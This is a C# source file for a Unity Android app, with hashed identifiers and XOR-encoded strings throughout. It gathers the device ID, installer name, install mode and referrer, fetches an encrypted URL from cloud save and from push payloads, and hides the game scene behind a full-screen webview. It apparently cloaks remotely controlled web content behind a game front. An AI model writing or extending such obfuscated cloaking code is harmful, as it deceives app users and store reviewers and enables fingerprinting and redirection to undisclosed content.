using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0x08e537a8 : MonoBehaviour
{
    private void _0x54a2c5ee()
    {
        {
#if B_LOGS
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[22] { 10, 5, 52, 34, 37, 12, 113, 2, 37, 62, 35, 52, 21, 52, 39, 56, 50, 52, 24, 63, 55, 62 }, 81));
#endif
        }

        _0x6918beb9 = SystemInfo.deviceModel;
        _0x2d8badc7 = Application.version;
        _0x79a8da39 = Application.installMode;
        _0xb30c3601 = Application.installerName;
        _0x65542f71 = Application.identifier;
        _0xb6c8efbf = _0xe7c31dc0();
        _0x8276e1fb = _0x9509e8d2();
        _0x0796227a = SystemInfo.deviceUniqueIdentifier;
        _0x579c0635 = SystemInfo.graphicsDeviceName;
        _0x34bc876f = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x2d8badc7 = _0x96e02e0a._0x40b5567f(new byte[5] { 170, 179, 170, 179, 170 }, 157);
                _0x79a8da39 = ApplicationInstallMode.Store;
                _0xb30c3601 = _0x96e02e0a._0x40b5567f(new byte[19] { 18, 30, 28, 95, 16, 31, 21, 3, 30, 24, 21, 95, 7, 20, 31, 21, 24, 31, 22 }, 113);
                _0x8276e1fb = _0x96e02e0a._0x40b5567f(new byte[8] { 93, 85, 72, 76, 65, 24, 77, 89 }, 56);
                _0x0796227a = Guid.NewGuid().ToString().Replace(_0x96e02e0a._0x40b5567f(new byte[1] { 143 }, 162), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[17] { 58, 53, 4, 18, 21, 60, 65, 5, 4, 23, 44, 14, 5, 4, 13, 91, 65 }, 97) + _0x6918beb9);
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[19] { 51, 60, 13, 27, 28, 53, 72, 9, 24, 24, 62, 13, 26, 27, 1, 7, 6, 82, 72 }, 104) + _0x2d8badc7);
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[20] { 219, 212, 229, 243, 244, 221, 160, 233, 238, 243, 244, 225, 236, 236, 205, 239, 228, 229, 186, 160 }, 128) + _0x79a8da39);
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[23] { 29, 18, 35, 53, 50, 27, 102, 47, 40, 53, 50, 39, 42, 42, 35, 52, 21, 50, 41, 52, 35, 124, 102 }, 70) + _0xb30c3601);
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[14] { 10, 5, 52, 34, 37, 12, 113, 48, 33, 33, 24, 53, 107, 113 }, 81) + _0x65542f71);
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[14] { 32, 47, 30, 8, 15, 38, 91, 26, 31, 13, 50, 31, 65, 91 }, 123) + _0xb6c8efbf);
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[18] { 219, 212, 229, 243, 244, 221, 160, 245, 243, 229, 242, 193, 231, 229, 238, 244, 186, 160 }, 128) + _0x8276e1fb);
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[17] { 86, 89, 104, 126, 121, 80, 45, 126, 116, 126, 73, 104, 123, 68, 105, 55, 45 }, 13) + _0x0796227a);
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[12] { 102, 105, 88, 78, 73, 96, 29, 90, 77, 72, 7, 29 }, 61) + _0x579c0635);
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[12] { 186, 181, 132, 146, 149, 188, 193, 130, 145, 148, 219, 193 }, 225) + _0x34bc876f);
#endif
        }
    }

    private void _0x1b8183ac()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private void _0x7f4a9802(string _0x337fcc1c)
    {
        if (string.IsNullOrEmpty(_0x337fcc1c))
            return;
        if (TryOpenExternalLikeChrome(_0x337fcc1c))
            return;
        OpenUrlExternally(_0x337fcc1c);
    }

    private static bool IsPrivacyItemTrue(Item _0xee853d47)
    {
        if (_0xee853d47.Key != _0x96e02e0a._0x40b5567f(new byte[9] { 122, 96, 67, 97, 122, 101, 114, 112, 106 }, 19))
            return false;
        try
        {
            var _0xc9075c82 = _0xee853d47.Value.GetAs<object>();
            return _0xc9075c82 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private bool _0x1d451dcf = false;
    private Canvas _0x49b4c59d;
    private bool _0xd7b3980c(string _0x10874218, string _0x6c5261fc)
    {
        string _0xee75f86c = _0x13535165(_0x10874218);
        if (string.IsNullOrEmpty(_0xee75f86c))
            _0xee75f86c = _0x6c5261fc;
        if (_0xf7ad7f69(_0xee75f86c))
            return true;
        string _0x6b35b25e = string.IsNullOrEmpty(_0xee75f86c) ? _0x96e02e0a._0x40b5567f(new byte[29] { 85, 73, 73, 77, 78, 7, 18, 18, 77, 81, 92, 68, 19, 90, 82, 82, 90, 81, 88, 19, 94, 82, 80, 18, 78, 73, 82, 79, 88 }, 61) : _0x96e02e0a._0x40b5567f(new byte[46] { 126, 98, 98, 102, 101, 44, 57, 57, 102, 122, 119, 111, 56, 113, 121, 121, 113, 122, 115, 56, 117, 121, 123, 57, 101, 98, 121, 100, 115, 57, 119, 102, 102, 101, 57, 114, 115, 98, 119, 127, 122, 101, 41, 127, 114, 43 }, 22) + _0xee75f86c;
        WLog(_0x96e02e0a._0x40b5567f(new byte[35] { 30, 53, 47, 50, 48, 56, 17, 52, 54, 56, 125, 48, 60, 47, 54, 56, 41, 125, 59, 60, 49, 49, 63, 60, 62, 54, 125, 60, 46, 125, 42, 56, 63, 103, 125 }, 93) + _0x6b35b25e);
        return _0xc6deb9b4(_0x6b35b25e);
    }

    internal string _0x13535165(string _0xd3357d2b)
    {
        int _0x943df860 = _0xd3357d2b.IndexOf(_0x96e02e0a._0x40b5567f(new byte[3] { 45, 32, 121 }, 68), StringComparison.OrdinalIgnoreCase);
        if (_0x943df860 < 0)
            return null;
        string _0x4ffbf5a0 = _0xd3357d2b.Substring(_0x943df860 + 3);
        int _0xa1c05722 = _0x4ffbf5a0.IndexOf('&');
        return _0xa1c05722 >= 0 ? _0x4ffbf5a0.Substring(0, _0xa1c05722) : _0x4ffbf5a0;
    }

    private bool _0xceff89cf = false;
    private string _0x579c0635 = "";
    private bool _0x65ab98e7 = false;
    private IEnumerator _0x5e34bfcf(string _0xa901aab1)
    {
        if (_0xf17178f5 != null && _0x6ab25542)
            yield break;
        _0xf17178f5 = gameObject.AddComponent<UniWebView>();
        _0x55bad334(_0xf17178f5);
        _0xff491514(_0xf17178f5);
        _0xf17178f5.BackgroundColor = Color.clear;
        var _0x0e549351 = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0x7273e4d1();
        yield return new WaitForEndOfFrame();
        _0x6ab25542 = true;
        _0x4d262dd3();
        _0x016e8f07(true);
        _0x303ec762 = false;
        _0x1028a85a = false;
        _0x81ab6676.Clear();
        _0x4af5ba3f = -1;
        firstLoadShown = false;
        _0x1d451dcf = false;
        _0xceff89cf = false;
        _0xf17178f5.SetUserAgent("");
        _0xf42cf416 = Time.realtimeSinceStartup;
        _0xf17178f5.Stop();
        _0xf17178f5.Load(_0xa901aab1);
        _0xf17178f5.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x96e02e0a._0x40b5567f(new byte[25] { 62, 18, 26, 29, 83, 36, 22, 17, 37, 26, 22, 4, 83, 58, 29, 26, 7, 26, 18, 31, 83, 32, 27, 28, 4 }, 115));
    }

    private float _0xf42cf416 = 0f;
    private void StopCurrentFailedLoad(UniWebView _0xf15eb0eb)
    {
        _0x016e8f07(false);
        if (_0xf15eb0eb == null)
            return;
        _0xf15eb0eb.Stop();
        if (_0xf15eb0eb.CanGoBack)
            _0xf15eb0eb.GoBack();
    }

    private bool _0xe0d47ea5(string _0x790f7cbb)
    {
        try
        {
            using (var _0x1e7aa3f2 = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[30] { 247, 251, 249, 186, 225, 250, 253, 224, 237, 167, 240, 186, 228, 248, 245, 237, 241, 230, 186, 193, 250, 253, 224, 237, 196, 248, 245, 237, 241, 230 }, 148)))
            using (var _0x402d101a = _0x1e7aa3f2.GetStatic<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[15] { 243, 229, 226, 226, 245, 254, 228, 209, 243, 228, 249, 230, 249, 228, 233 }, 144)))
            using (var _0xc877d69a = _0x402d101a.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[17] { 206, 204, 221, 249, 200, 202, 194, 200, 206, 204, 228, 200, 199, 200, 206, 204, 219 }, 169)))
            using (var _0x8040b28c = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[22] { 80, 95, 85, 67, 94, 88, 85, 31, 82, 94, 95, 69, 84, 95, 69, 31, 120, 95, 69, 84, 95, 69 }, 49)))
            using (var _0x04582eb4 = _0x8040b28c.CallStatic<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[8] { 249, 232, 251, 250, 236, 220, 251, 224 }, 137), _0x790f7cbb, 1))
            {
                string _0xb5a155e0 = _0x04582eb4.Call<string>(_0x96e02e0a._0x40b5567f(new byte[14] { 158, 156, 141, 170, 141, 139, 144, 151, 158, 188, 129, 141, 139, 152 }, 249), _0x96e02e0a._0x40b5567f(new byte[20] { 185, 169, 180, 172, 168, 190, 169, 132, 189, 186, 183, 183, 185, 186, 184, 176, 132, 174, 169, 183 }, 219));
                string _0x20c9fe74 = _0x04582eb4.Call<string>(_0x96e02e0a._0x40b5567f(new byte[10] { 14, 12, 29, 57, 8, 10, 2, 8, 14, 12 }, 105));
                _0x04582eb4.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[11] { 205, 200, 200, 239, 205, 216, 201, 203, 195, 222, 213 }, 172), _0x96e02e0a._0x40b5567f(new byte[33] { 76, 67, 73, 95, 66, 68, 73, 3, 68, 67, 89, 72, 67, 89, 3, 78, 76, 89, 72, 74, 66, 95, 84, 3, 111, 127, 98, 122, 126, 108, 111, 97, 104 }, 45));
                _0x04582eb4.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[11] { 142, 153, 145, 147, 138, 153, 185, 132, 136, 142, 157 }, 252), _0x96e02e0a._0x40b5567f(new byte[20] { 131, 147, 142, 150, 146, 132, 147, 190, 135, 128, 141, 141, 131, 128, 130, 138, 190, 148, 147, 141 }, 225));
                if (_0x04582eb4.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[15] { 78, 89, 79, 83, 80, 74, 89, 125, 95, 72, 85, 74, 85, 72, 69 }, 60), _0xc877d69a) != null)
                {
                    WLog(_0x96e02e0a._0x40b5567f(new byte[24] { 122, 81, 75, 86, 84, 92, 117, 80, 82, 92, 25, 86, 73, 92, 87, 25, 80, 87, 77, 92, 87, 77, 3, 25 }, 57) + _0x790f7cbb);
                    _0x04582eb4.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[8] { 156, 153, 153, 187, 145, 156, 154, 142 }, 253), 0x10000000);
                    _0x402d101a.Call(_0x96e02e0a._0x40b5567f(new byte[13] { 169, 174, 187, 168, 174, 155, 185, 174, 179, 172, 179, 174, 163 }, 218), _0x04582eb4);
                    return true;
                }

                if (_0xf7ad7f69(_0x20c9fe74))
                    return true;
                if (!string.IsNullOrEmpty(_0xb5a155e0))
                {
                    WLog(_0x96e02e0a._0x40b5567f(new byte[28] { 252, 215, 205, 208, 210, 218, 243, 214, 212, 218, 159, 214, 209, 203, 218, 209, 203, 159, 217, 222, 211, 211, 221, 222, 220, 212, 133, 159 }, 191) + _0xb5a155e0);
                    if (_0x9e0238d1(_0xb5a155e0))
                        return _0xd7b3980c(_0xb5a155e0, _0x20c9fe74);
                    return _0xc6deb9b4(_0xb5a155e0);
                }

                WLog(_0x96e02e0a._0x40b5567f(new byte[30] { 242, 217, 195, 222, 220, 212, 253, 216, 218, 212, 145, 216, 223, 197, 212, 223, 197, 145, 223, 222, 145, 217, 208, 223, 213, 221, 212, 195, 139, 145 }, 177) + _0x790f7cbb);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x96e02e0a._0x40b5567f(new byte[26] { 215, 252, 230, 251, 249, 241, 216, 253, 255, 241, 180, 253, 250, 224, 241, 250, 224, 180, 242, 245, 253, 248, 241, 240, 174, 180 }, 148) + e.Message);
            return true;
        }
    }

    private void _0x0643685d(string _0x35946767)
    {
        _0x1144587b();
        StartCoroutine(_0x5e34bfcf(_0x35946767));
    }

    private static string ReadPushField(Dictionary<string, object> _0xf84610ff, string _0x62e4aff8)
    {
        if (_0xf84610ff == null || string.IsNullOrEmpty(_0x62e4aff8))
            return string.Empty;
        if (_0xf84610ff.TryGetValue(_0x96e02e0a._0x40b5567f(new byte[16] { 50, 51, 40, 53, 58, 53, 63, 61, 40, 53, 51, 50, 24, 61, 40, 61 }, 92), out var raw))
        {
            try
            {
                var _0x2dc570b8 = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0x2dc570b8 != null && _0x2dc570b8.TryGetValue(_0x62e4aff8, out var nestedVal))
                {
                    var _0xef9b1913 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0xef9b1913))
                        return _0xef9b1913;
                }
            }
            catch
            {
            }
        }

        if (_0xf84610ff.TryGetValue(_0x62e4aff8, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private string _0xf16dcc98 = "";
    private async Task<string> _0x58ec633f(int _0x057a4307 = 5, int _0xad46f957 = 500)
    {
        try
        {
            List<EntityData> _0xf552e161 = new List<EntityData>();
            int _0x0a88e5bc = 0;
            do
            {
                _0xf552e161 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x96e02e0a._0x40b5567f(new byte[8] { 202, 214, 219, 195, 223, 200, 243, 222 }, 186), _0x0085ddb5, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x0085ddb5 }), new QueryOptions())).ToList();
                await Task.Delay(_0xad46f957);
            }
            while (_0xf552e161.Count == 0 && _0x0a88e5bc++ < _0x057a4307);
            {
#if B_LOGS
                {
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[33] { 125, 114, 67, 85, 82, 123, 6, 117, 71, 80, 67, 66, 6, 106, 79, 72, 77, 6, 119, 83, 67, 84, 95, 6, 84, 67, 85, 83, 74, 82, 85, 28, 6 }, 38) + JsonConvert.SerializeObject(_0xf552e161, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[39] { 102, 105, 88, 78, 73, 96, 29, 110, 92, 75, 88, 89, 29, 113, 84, 83, 86, 29, 108, 72, 88, 79, 68, 29, 79, 88, 78, 72, 81, 73, 78, 29, 94, 82, 72, 83, 73, 7, 29 }, 61) + _0xf552e161.Count);
                }
#endif
            }

            var _0xb5c17c2c = _0xf552e161.SelectMany(_0xc4612bd6 => _0xc4612bd6.Data).FirstOrDefault(_0xc07a7ab8 => _0xc07a7ab8.Key == _0x0085ddb5)?.Value.GetAs<string>() ?? string.Empty;
            _0xb5c17c2c = Decrypt(_0xb5c17c2c, _0x0085ddb5);
            {
#if B_LOGS
                {
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[24] { 152, 151, 166, 176, 183, 158, 227, 143, 172, 162, 167, 227, 176, 162, 181, 166, 167, 227, 175, 170, 173, 168, 249, 227 }, 195) + _0xb5c17c2c);
                }
#endif
            }

            return _0xb5c17c2c;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[39] { 189, 178, 131, 149, 146, 187, 198, 161, 131, 146, 198, 137, 148, 198, 150, 135, 148, 149, 131, 198, 149, 135, 144, 131, 130, 198, 138, 143, 136, 141, 198, 128, 135, 143, 138, 131, 130, 220, 198 }, 230) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private void _0x10d0e745()
    {
        if (_0xceff89cf)
        {
            WLog(_0x96e02e0a._0x40b5567f(new byte[18] { 190, 131, 146, 143, 219, 154, 151, 137, 158, 154, 159, 130, 219, 136, 147, 148, 140, 149 }, 251));
            return;
        }

        _0x016e8f07(false);
        WLog(_0x96e02e0a._0x40b5567f(new byte[46] { 42, 6, 14, 9, 71, 48, 2, 5, 49, 14, 2, 16, 71, 55, 18, 20, 15, 71, 41, 8, 19, 14, 1, 14, 4, 6, 19, 14, 8, 9, 71, 79, 15, 6, 21, 3, 16, 6, 21, 2, 71, 5, 6, 4, 12, 78 }, 103));
        ++_0xed1a24d2;
        _0x05e9f336();
        if (_0xed1a24d2 <= 1)
            return;
        if (_0x68255702())
        {
            WLog(_0x96e02e0a._0x40b5567f(new byte[37] { 198, 251, 234, 247, 163, 240, 232, 234, 243, 243, 230, 231, 163, 174, 189, 163, 243, 236, 243, 246, 243, 240, 163, 240, 247, 234, 239, 239, 163, 236, 243, 230, 237, 230, 231, 185, 163 }, 131) + _0x81ab6676.Count);
            return;
        }

        Application.Quit();
    }

    private string _0x03ffc039 = "";
    internal bool isApplicationPause = false;
    private bool _0x303ec762 = false;
    private string _0xe84d82d3 { get; set; }

    private IEnumerator _0x9681e72e(float _0x4b692a84)
    {
        yield return new WaitForSeconds(_0x4b692a84);
        if (!_0x70c88953)
        {
            _0x70c88953 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0x0bc456ee}");
                }
#endif
            }
        }
    }

    private Canvas _0xee19c31e()
    {
        if (_0x49b4c59d != null)
            return _0x49b4c59d;
        var _0x9ec38c0a = gameObject.GetComponentInChildren<Canvas>();
        if (_0x9ec38c0a == null)
        {
            var _0xe2aa5e43 = new GameObject(_0x96e02e0a._0x40b5567f(new byte[6] { 73, 107, 100, 124, 107, 121 }, 10), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x9ec38c0a = _0xe2aa5e43.GetComponent<Canvas>();
            _0x9ec38c0a.transform.SetParent(transform, false);
            _0x9ec38c0a.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x49b4c59d = _0x9ec38c0a;
        return _0x49b4c59d;
    }

    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x274a1456(string _0x334c190a, string _0xecfd81f9)
    {
        try
        {
            using var _0x14949fda = Aes.Create();
            _0x14949fda.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xecfd81f9));
            _0x14949fda.GenerateIV();
            using var _0x46a9473a = new MemoryStream();
            _0x46a9473a.Write(_0x14949fda.IV, 0, _0x14949fda.IV.Length);
            using (var _0x9958fb5d = new CryptoStream(_0x46a9473a, _0x14949fda.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0x8dc593ea = Encoding.UTF8.GetBytes(_0x334c190a);
                _0x9958fb5d.Write(_0x8dc593ea, 0, _0x8dc593ea.Length);
                _0x9958fb5d.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x46a9473a.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    internal bool IsGoogleAuthFlowUrl(string _0xf7aa329d)
    {
        if (string.IsNullOrEmpty(_0xf7aa329d))
            return false;
        return _0xf7aa329d.IndexOf(_0x96e02e0a._0x40b5567f(new byte[19] { 26, 24, 24, 20, 14, 21, 15, 8, 85, 28, 20, 20, 28, 23, 30, 85, 24, 20, 22 }, 123), StringComparison.OrdinalIgnoreCase) >= 0 || _0xf7aa329d.IndexOf(_0x96e02e0a._0x40b5567f(new byte[16] { 192, 194, 194, 206, 212, 207, 213, 210, 143, 198, 206, 206, 198, 205, 196, 143 }, 161), StringComparison.OrdinalIgnoreCase) >= 0 || _0xf7aa329d.IndexOf(_0x96e02e0a._0x40b5567f(new byte[21] { 0, 8, 8, 0, 11, 2, 18, 20, 2, 21, 4, 8, 9, 19, 2, 9, 19, 73, 4, 8, 10 }, 103), StringComparison.OrdinalIgnoreCase) >= 0 || _0xf7aa329d.IndexOf(_0x96e02e0a._0x40b5567f(new byte[11] { 241, 229, 226, 247, 226, 255, 245, 184, 245, 249, 251 }, 150), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private void OnApplicationFocus(bool _0x6303d729)
    {
        isApplicationFocus = _0x6303d729;
        if (_0x6303d729 && _0x6ab25542)
        {
            _0x1144587b();
        }
    }

    internal bool IsHttpUrl(string _0x7fbf1782)
    {
        if (string.IsNullOrEmpty(_0x7fbf1782))
            return false;
        return _0x7fbf1782.StartsWith(_0x96e02e0a._0x40b5567f(new byte[7] { 142, 146, 146, 150, 220, 201, 201 }, 230), StringComparison.OrdinalIgnoreCase) || _0x7fbf1782.StartsWith(_0x96e02e0a._0x40b5567f(new byte[8] { 211, 207, 207, 203, 200, 129, 148, 148 }, 187), StringComparison.OrdinalIgnoreCase);
    }

    private ApplicationInstallMode _0x79a8da39 = ApplicationInstallMode.Unknown;
    private void _0x4cbbba01()
    {
        WLog(_0x96e02e0a._0x40b5567f(new byte[21] { 69, 108, 127, 105, 122, 108, 127, 104, 45, 111, 108, 110, 102, 45, 125, 127, 104, 126, 126, 104, 105 }, 13));
        if (Time.frameCount == _0x4af5ba3f)
            return;
        _0x4af5ba3f = Time.frameCount;
        if (_0x7875f684())
            return;
        _0x10d0e745();
    }

    private bool TryOpenExternalLikeChrome(string _0xefcdc9b6)
    {
        if (string.IsNullOrEmpty(_0xefcdc9b6))
            return false;
        if (_0xefcdc9b6.StartsWith(_0x96e02e0a._0x40b5567f(new byte[9] { 174, 169, 179, 162, 169, 179, 253, 232, 232 }, 199), StringComparison.OrdinalIgnoreCase))
            return _0xe0d47ea5(_0xefcdc9b6);
        if (_0x9e0238d1(_0xefcdc9b6))
            return _0xd7b3980c(_0xefcdc9b6, null);
        if (!_0xefcdc9b6.StartsWith(_0x96e02e0a._0x40b5567f(new byte[7] { 96, 124, 124, 120, 50, 39, 39 }, 8), StringComparison.OrdinalIgnoreCase) && !_0xefcdc9b6.StartsWith(_0x96e02e0a._0x40b5567f(new byte[8] { 113, 109, 109, 105, 106, 35, 54, 54 }, 25), StringComparison.OrdinalIgnoreCase) && !_0xefcdc9b6.StartsWith(_0x96e02e0a._0x40b5567f(new byte[11] { 6, 5, 8, 18, 19, 93, 5, 11, 6, 9, 12 }, 103), StringComparison.OrdinalIgnoreCase))
        {
            return _0xc6deb9b4(_0xefcdc9b6);
        }

        return false;
    }

    private Action _0x961809d3;
    private int _0x80430122 = 5, _0x7f45bfd3 = 5, _0xa7041f34 = 5, _0xac07147d = 5;
    private string _0x501fff6f = "";
    private string _0x4aeac62c = "";
    private IEnumerator _0x653c1e87(Dictionary<string, object> _0xb4e092ea)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[30] { 208, 223, 238, 248, 255, 214, 171, 205, 238, 255, 232, 227, 171, 206, 243, 255, 249, 234, 171, 219, 254, 248, 227, 171, 207, 234, 255, 234, 177, 171 }, 139) + string.Join(_0x96e02e0a._0x40b5567f(new byte[1] { 17 }, 24), _0xb4e092ea));
#endif
            }
        }

        string _0x622ad5be = "";
        // Primary source: nested JSON under "notificationData"
        if (_0xb4e092ea != null && _0xb4e092ea.TryGetValue(_0x96e02e0a._0x40b5567f(new byte[16] { 247, 246, 237, 240, 255, 240, 250, 248, 237, 240, 246, 247, 221, 248, 237, 248 }, 153), out var raw))
        {
            try
            {
                var _0x69393c0f = raw?.ToString();
                var _0xd0a880c8 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x69393c0f);
                if (_0xd0a880c8 != null && _0xd0a880c8.TryGetValue(_0x96e02e0a._0x40b5567f(new byte[6] { 87, 65, 74, 64, 77, 64 }, 36), out var val))
                {
                    _0x622ad5be = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x96e02e0a._0x40b5567f(new byte[30] { 37, 42, 27, 13, 10, 94, 46, 11, 13, 22, 35, 94, 52, 45, 49, 48, 94, 14, 31, 12, 13, 27, 94, 27, 12, 12, 17, 12, 68, 94 }, 126) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0x622ad5be) && _0xb4e092ea != null && _0xb4e092ea.TryGetValue(_0x96e02e0a._0x40b5567f(new byte[6] { 237, 251, 240, 250, 247, 250 }, 158), out var lab))
        {
            _0x622ad5be = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[38] { 148, 155, 170, 188, 187, 239, 159, 186, 188, 167, 146, 239, 137, 170, 187, 172, 167, 170, 171, 239, 188, 170, 161, 171, 166, 171, 239, 169, 189, 160, 162, 239, 165, 188, 160, 161, 245, 239 }, 207) + _0x622ad5be);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0x622ad5be))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[38] { 95, 80, 97, 119, 112, 36, 84, 113, 119, 108, 89, 36, 83, 101, 109, 112, 36, 112, 107, 36, 107, 116, 97, 106, 36, 115, 109, 112, 108, 36, 119, 97, 106, 96, 109, 96, 62, 36 }, 4) + _0x622ad5be);
            }
#endif
        }

        _0x9d112333 = _0x622ad5be;
        yield return new WaitUntil(() => _0x6ab25542);
        var _0x8dfc6e99 = _0x58ec633f(2, 100);
        yield return new WaitUntil(() => _0x8dfc6e99.IsCompleted);
        string _0xef252f4a = _0x8dfc6e99.Result;
        if (!string.IsNullOrEmpty(_0xef252f4a))
        {
            string _0x30f148e8 = _0x5c567bda(_0xef252f4a, _0x622ad5be);
            {
#if B_LOGS
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[33] { 185, 182, 135, 145, 150, 194, 178, 151, 145, 138, 191, 194, 176, 135, 142, 141, 131, 134, 194, 181, 135, 128, 180, 139, 135, 149, 194, 149, 139, 150, 138, 216, 194 }, 226) + _0x30f148e8);
#endif
            }

            _0xf17178f5.Load(_0x30f148e8);
        }
    }

    private bool _0x68fb8605 = false;
    private string _0x0085ddb5 = "";
    private UniWebViewPopup _0x38f34823()
    {
        for (int _0x289895c6 = _0x81ab6676.Count - 1; _0x289895c6 >= 0; _0x289895c6--)
        {
            var _0x5ff418b1 = _0x81ab6676[_0x289895c6];
            if (_0x5ff418b1 != null && _0x5ff418b1.IsAlive)
                return _0x5ff418b1;
            _0x81ab6676.RemoveAt(_0x289895c6);
        }

        return null;
    }

    private IEnumerator _0xe0781993()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    private RectTransform _0xfd43c7b3;
    private int _0x4af5ba3f = -1;
    private async Task<bool> _0x147d42d4()
    {
        {
#if B_LOGS
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[37] { 108, 99, 82, 68, 67, 106, 23, 100, 94, 80, 89, 126, 89, 98, 89, 94, 67, 78, 100, 82, 69, 65, 94, 84, 82, 68, 118, 89, 88, 89, 78, 90, 88, 66, 68, 91, 78 }, 55));
#endif
        }

        try
        {
            var _0x1d83582b = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x1d83582b);
            {
#if B_LOGS
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[32] { 38, 41, 24, 14, 9, 32, 93, 40, 19, 20, 9, 4, 46, 24, 15, 11, 20, 30, 24, 14, 93, 52, 19, 20, 9, 20, 28, 17, 20, 7, 24, 25 }, 125));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[20] { 48, 33, 55, 48, 68, 49, 10, 13, 16, 29, 55, 1, 22, 18, 13, 7, 1, 23, 94, 68 }, 100) + ex.Message);
#endif
            }

            _0x979cb192?._0x52176c73();
            return true;
        }

        bool _0xe593414d = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0xe593414d = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x96e02e0a._0x40b5567f(new byte[37] { 147, 156, 173, 187, 188, 149, 232, 155, 161, 175, 166, 229, 161, 166, 232, 137, 166, 167, 166, 177, 165, 167, 189, 187, 230, 232, 152, 164, 169, 177, 173, 186, 232, 129, 140, 242, 232 }, 200) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x0085ddb5 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[25] { 178, 163, 181, 178, 198, 181, 143, 129, 136, 203, 143, 136, 198, 167, 147, 146, 142, 198, 163, 180, 180, 169, 180, 220, 198 }, 230) + ex.Message);
#endif
                }

                _0x979cb192?._0x52176c73();
                return true;
            }
